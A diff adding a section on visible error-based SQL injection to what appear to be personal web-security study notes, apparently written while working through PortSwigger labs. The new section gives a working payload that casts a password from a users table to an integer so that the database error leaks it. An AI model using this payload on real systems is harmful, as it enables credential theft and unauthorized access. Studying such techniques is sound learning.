@@ -56,3 +56,8 @@ On Oracle, you can find the same information as follows:
 	- if username = 'administrator' and password starts with `m` -> output error
 	- else app behaves normally.
 - check [Portswagger cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+### Visible error-based SQL injection
+- `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--`
+	- if the database is misconfigured it should throw an error like: ERROR: invalid input syntax for type integer: "2x2i4tqll4ctr686jsx2".
+	- the value between the double quotes is the password.
